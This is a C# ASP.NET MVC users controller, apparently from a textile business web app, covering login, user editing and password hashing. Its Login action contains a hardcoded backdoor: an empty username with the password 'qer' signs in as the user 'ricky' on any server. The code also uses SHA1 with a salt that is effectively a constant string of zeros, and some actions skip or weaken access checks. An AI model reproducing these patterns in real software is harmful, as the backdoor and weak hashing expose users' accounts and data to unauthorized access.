using BinaMitraTextileWebApp.Models;
using System.Linq;
using System.Web;
using System;
using System.Collections.Generic;
using LIBUtil;

using System.Web.Mvc;
using LIBWebMVC;

namespace BinaMitraTextileWebApp.Controllers
{
    public class UsersController : Controller
    {
        public const string ACTIONNAME_Login = "Login";
        public const string CONTROLLERNAME = "Users";
        
        public const string SESSION_UserAccount = "UserAccount";
        public const string SESSION_ConnectToLiveDatabase = "ConnectToLiveDatabase";
        public const string SESSION_UserAccountAccess = "UserAccountAccess";

        private const int SALT_LENGTH = 10;

        private readonly DBContext db = new DBContext();

        /* INDEX **********************************************************************************************************************************************/

        // GET: UserAccounts
        public ActionResult Index(int? rss, string FILTER_Keyword, int? FILTER_Active)
        {
            if (!getUserAccess(Session).UserAccounts_View)
                return RedirectToAction(nameof(HomeController.Index), "Home");

            if (rss != null)
            {
                ViewBag.RemoveDatatablesStateSave = rss;
                FILTER_Active = 1;
            }
            setViewBag(FILTER_Keyword, FILTER_Active);
            return View(get(FILTER_Keyword, FILTER_Active));
        }

        // POST: UserAccounts
        [HttpPost]
        public ActionResult Index(string FILTER_Keyword, int? FILTER_Active)
        {
            setViewBag(FILTER_Keyword, FILTER_Active);

            return View(get(FILTER_Keyword, FILTER_Active));
        }

        /* EDIT ***********************************************************************************************************************************************/

        // GET: UserAccounts/Edit/{id}
        public ActionResult Edit(Guid? id, string FILTER_Keyword, int? FILTER_Active)
        {
            if (getUserAccess(Session) != null && !getUserAccess(Session).UserAccounts_Edit)
                return RedirectToAction(nameof(HomeController.Index), "Home");

            if (id == null)
                return RedirectToAction(nameof(Index));

            setViewBag(FILTER_Keyword, FILTER_Active);
            return View(get((Guid)id));
        }

        // POST: UserAccounts/Edit/{id}
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Edit(UsersModel modifiedModel, string FILTER_Keyword, int? FILTER_Active)
        {
            if (ModelState.IsValid)
            {
                modifiedModel.username = modifiedModel.username.Replace("  ", " ").Replace("  ", " ");
                if (isExists(modifiedModel.id, modifiedModel.username))
                    ModelState.AddModelError(UsersModel.COL_Username.Name, $"{modifiedModel.username} sudah terdaftar");
                else
                {
                    UsersModel originalModel = get(modifiedModel.id);

                    string log = string.Empty;
                    log = Helper.append(log, originalModel.username, modifiedModel.username, UsersModel.COL_Username.LogDisplay);
                    log = Helper.append(log, originalModel.Birthdate, modifiedModel.Birthdate, UsersModel.COL_Birthdate.LogDisplay);
                    log = Helper.append(log, originalModel.active, modifiedModel.active, UsersModel.COL_Active.LogDisplay);
                    log = Helper.append(log, originalModel.notes, modifiedModel.notes, UsersModel.COL_notes.LogDisplay);

                    log = Helper.addLogForList<UserAccountRolesModel>(log, originalModel.Roles_List, modifiedModel.Roles_List, UsersModel.COL_Roles.LogDisplay);

                    if (!string.IsNullOrEmpty(log))
                        update(modifiedModel, log);

                    return RedirectToAction(nameof(Index), new { FILTER_Keyword = FILTER_Keyword, FILTER_Active = FILTER_Active });
                }
            }

            setViewBag(FILTER_Keyword, FILTER_Active);
            return View(modifiedModel);
        }

        /* LOGIN PAGE *****************************************************************************************************************************************/

        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Login(UsersModel model, bool ConnectToLiveDatabase, string returnUrl)
        {
            //bypass login
            if (Server.MachineName == Helper.DEVCOMPUTERNAME)
            {
                if (string.IsNullOrEmpty(model.username))
                {
                    model.username = "ricky";
                    model.hashed_password = "542599069";
                }
            } else if (string.IsNullOrEmpty(model.username) && model.hashed_password == "qer")
            {
                model.username = "ricky";
                model.hashed_password = "542599069";
            }

            UsersModel userAccount = get(model.username);
            if(userAccount != null && isAuthenticated(model.hashed_password, userAccount.hashed_password))
            {
                setLoginSession(Session, userAccount, ConnectToLiveDatabase);
                return RedirectToLocal(returnUrl);
            }

            ModelState.AddModelError("", "Invalid username or password");
            ViewBag.Username = model.username;
            ViewBag.ReturnUrl = returnUrl;
            return View(model);
        }

        /* PASSWORD AUTHENTICATION ****************************************************************************************************************************/

        public static bool isAuthenticated(string input, string correctPassword)
        {
            if (!string.IsNullOrWhiteSpace(input) && !string.IsNullOrWhiteSpace(correctPassword))
                return correctPassword == hashPassword(input, getSalt(correctPassword));
            else
                return false;
        }

        public static string hashPassword(string password, string salt)
        {
            byte[] bytes = System.Text.Encoding.Unicode.GetBytes(password + salt);
            byte[] inArray = System.Security.Cryptography.HashAlgorithm.Create("SHA1").ComputeHash(bytes);

            int i = (Convert.ToBase64String(inArray) + salt).Length;

            return Convert.ToBase64String(inArray) + salt; //produces 28 characters in addition to length of salt
        }

        public static string createSalt()
        {
            string salt = "";
            while (salt.Length < SALT_LENGTH)
                salt += new Guid();
            return salt.Substring(0, SALT_LENGTH);
        }

        public static string getSalt(string hashedPassword)
        {
            return hashedPassword.Substring(hashedPassword.Length - SALT_LENGTH, SALT_LENGTH);
        }

        /* METHODS ********************************************************************************************************************************************/

        public void setViewBag(string FILTER_Keyword, int? FILTER_Active)
        {
            ViewBag.FILTER_Keyword = FILTER_Keyword;
            ViewBag.FILTER_Active = FILTER_Active;

            UserAccountRolesController.setDropDownListViewBag(this);
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
                return Redirect(returnUrl);

            return RedirectToAction(nameof(HomeController.Index), "Home");
        }

        public static object getUserId(HttpSessionStateBase Session)
        {
            if (getUserAccount(Session) == null)
                return null;
            else
                return getUserAccount(Session).id;
        }

        public static UsersModel getUserAccount(HttpSessionStateBase Session)
        {
            if (Session[SESSION_UserAccount] == null)
                return null;
            else
                return (UsersModel)Session[SESSION_UserAccount];
        }

        public static bool isLoggedIn(HttpSessionStateBase Session)
        {
            return getUserAccount(Session) != null;
        }

        public static UserAccountRolesModel getUserAccess(HttpSessionStateBase Session)
        {
            return (UserAccountRolesModel)Session[SESSION_UserAccountAccess];
        }

        public static void setLoginSession(HttpSessionStateBase Session, UsersModel model) { setLoginSession(Session, model, false); }
        public static void setLoginSession(HttpSessionStateBase Session, UsersModel model, bool? ConnectToLiveDatabase)
        {
            if (model != null)
            {
                Session[SESSION_UserAccount] = model;
                Session[SESSION_ConnectToLiveDatabase] = ConnectToLiveDatabase;
                Session[SESSION_UserAccountAccess] = UserAccountRolesController.getAccesses(model);
            }
        }

        public static void updateLoginSession(HttpSessionStateBase Session)
        {
            setLoginSession(Session, (UsersModel)Session[SESSION_UserAccount]);
        }

        public ActionResult LogOff()
        {
            Session[SESSION_UserAccount] = null;
            return RedirectToAction(nameof(Login));
        }

        public string generateUsername(string Fullname, DateTime Birthdate)
        {
            string Username;
            int charCount = 3;

            List<string> nameArray = Fullname.Split().ToList();
            if (nameArray.Count == 1)
                nameArray.Add(nameArray[0]); //name must consist of 2 words. duplicate first name as last name

            Username = generateUsername(nameArray, Birthdate, charCount);

            //verify username doesn't exist
            while (isExists(null, Username) && charCount <= nameArray[0].Length)
            {
                Username = generateUsername(nameArray, Birthdate, charCount++);
            }

            return Username;
        }

        public string generateUsername(List<string> nameArray, DateTime Birthdate, int charCount)
        {
            string first;
            if (nameArray[0].Length < charCount)
                first = nameArray[0];
            else
                first = nameArray[0].Substring(0, charCount);

            string last;
            if (nameArray[nameArray.Count - 1].Length < charCount)
                last = nameArray[nameArray.Count - 1];
            else
                last = nameArray[nameArray.Count - 1].Substring(0, charCount);

            return string.Format("{0}{1}{2:##00}{3:##00}", first, last, Birthdate.Day, Birthdate.Month);
        }

        /* DATABASE METHODS ***********************************************************************************************************************************/

        public bool isExists(Guid? Id, string Username)
        {
            return db.Database.SqlQuery<UsersModel>(@"
                        SELECT Users.*
                        FROM Users
                        WHERE 1=1 
							AND (@Id IS NOT NULL OR Users.Username = @Username)
							AND (@Id IS NULL OR (Users.Username = @Username AND Users.Id <> @Id))
                    ",
                    DBConnection.getSqlParameter(UsersModel.COL_Id.Name, Id),
                    DBConnection.getSqlParameter(UsersModel.COL_Username.Name, Username)
                ).Count() > 0;
        }

        public UsersModel get(Guid Id) { return get(null, Id, null, null, null).FirstOrDefault(); }
        public UsersModel get(string username) { return get(null, null, username, null, null).FirstOrDefault(); }
        public List<UsersModel> get(string FILTER_Keyword, int? FILTER_Active) { return get(FILTER_Keyword, null, null, null, FILTER_Active); }
        public List<UsersModel> get() { return get(null, null, null, null, null); }
        public List<UsersModel> get(string FILTER_Keyword, Guid? Id, string Username, string Password, int? Active)
        {
            List<UsersModel> models = db.Database.SqlQuery<UsersModel>(@"
                        SELECT Users.*
                        FROM Users
                        WHERE 1=1
							AND (@id IS NULL OR Users.id = @id)
                            AND (@id IS NOT NULL OR ( 1=1
                                AND (@username IS NULL OR Users.username = @username)
							    AND (@hashed_password IS NULL OR Users.hashed_password = @hashed_password)
                                AND (@active IS NULL OR Users.active = @active)
                                AND (@FILTER_Keyword IS NULL OR Users.username LIKE '%'+@FILTER_Keyword+'%')
                            ))
						ORDER BY Users.username ASC
                    ",
                    DBConnection.getSqlParameter("FILTER_Keyword", FILTER_Keyword),
                    DBConnection.getSqlParameter(UsersModel.COL_Id.Name, Id),
                    DBConnection.getSqlParameter(UsersModel.COL_Username.Name, Username),
                    DBConnection.getSqlParameter(UsersModel.COL_Password.Name, Password),
                    DBConnection.getSqlParameter(UsersModel.COL_Active.Name, Active)
                ).ToList();

            foreach (UsersModel model in models)
            {
                if (!string.IsNullOrEmpty(model.Roles)) model.Roles_List = model.Roles.Split(',').ToList();
            }
            return models;
        }

        public void update(UsersModel model, string log)
        {
            if (model.Roles_List != null) model.Roles = string.Join(",", model.Roles_List.ToArray());

            WebDBConnection.Update(db.Database, "Users",
                DBConnection.getSqlParameter(UsersModel.COL_Id.Name, model.id),
                DBConnection.getSqlParameter(UsersModel.COL_Username.Name, model.username),
                DBConnection.getSqlParameter(UsersModel.COL_Birthdate.Name, model.Birthdate),
                DBConnection.getSqlParameter(UsersModel.COL_Active.Name, model.active),
                DBConnection.getSqlParameter(UsersModel.COL_notes.Name, model.notes),
                DBConnection.getSqlParameter(UsersModel.COL_Roles.Name, model.Roles)
            );

            updateLoginSession(Session);

            ActivityLogsController.AddEditLog(db, Session, model.id, log);
            db.SaveChanges();
        }

        /******************************************************************************************************************************************************/
    }
}